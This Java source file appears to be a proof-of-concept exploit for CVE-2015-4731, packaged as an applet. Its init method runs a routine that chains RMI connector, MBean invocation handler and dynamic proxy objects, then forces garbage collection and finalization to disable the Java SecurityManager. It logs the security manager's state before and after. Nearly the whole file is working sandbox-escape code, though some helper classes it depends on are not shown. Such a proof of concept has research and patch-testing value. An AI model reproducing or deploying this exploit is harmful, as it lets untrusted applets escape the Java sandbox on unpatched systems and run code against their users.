package poc.cve_2015_4731;

import java.applet.Applet;
import java.lang.reflect.Proxy;

import javax.management.MBeanServerConnection;
import javax.management.MBeanServerInvocationHandler;
import javax.management.ObjectName;
import javax.management.remote.rmi.RMIConnector;
import javax.management.remote.rmi.RMIServer;

import poc.shared.Utils;

public class Main extends Applet {

	private static final long serialVersionUID = 4971090279885646544L;
	
	@SuppressWarnings("rawtypes")
	private static void disableSecurity( ) {
		try {
			Utils.enter( "Disable SecurtityManager" );
			
			final ClassLoader cl = Main.class.getClassLoader();
			final Class[] mbsc = {
					MBeanServerConnection.class
			};
			final Class[] fina = {
					Finalizer.class
			};
			
			Utils.log( "Creating RMI Server." );
			RMIServer rmiServer = new RMIServerImpl( null );
			
			Utils.log( "Creating RMI Connector." );
			RMIConnector rmiConnector = new RMIConnector( rmiServer, null );
			rmiConnector.connect();
			
			Utils.log( "Creating RMI Connection." );
			MBeanServerConnection rmiConnection = rmiConnector.getMBeanServerConnection();
			
			Utils.log( "Creating ACT InvocationHandler." );
			MBeanServerInvocationHandler actHandler = new MBeanServerInvocationHandler( rmiConnection, new ObjectName( "" ) );
			MBeanServerConnection proxyConnection = ( MBeanServerConnection ) Proxy.newProxyInstance( cl, mbsc, actHandler );
			
			Utils.log( "Creating Proxy InvocationHandler." );
			MBeanServerInvocationHandler finHandler = new MBeanServerInvocationHandler( proxyConnection, new ProxyObjectName( ) );
			Proxy.newProxyInstance( cl, fina, finHandler );
			
			
			System.gc( );
			System.runFinalization();
			
			Utils.log( "Waiting for Secondary read completion." );
			while( System.getSecurityManager() != null );
			
			rmiConnector.close();
			
		}
		catch( Throwable t ) {
			t.printStackTrace();
		}
		finally {
			Utils.exit();
		}
	}
	
	@Override
	public void init( ) {
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
		Main.disableSecurity();
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
	}
}
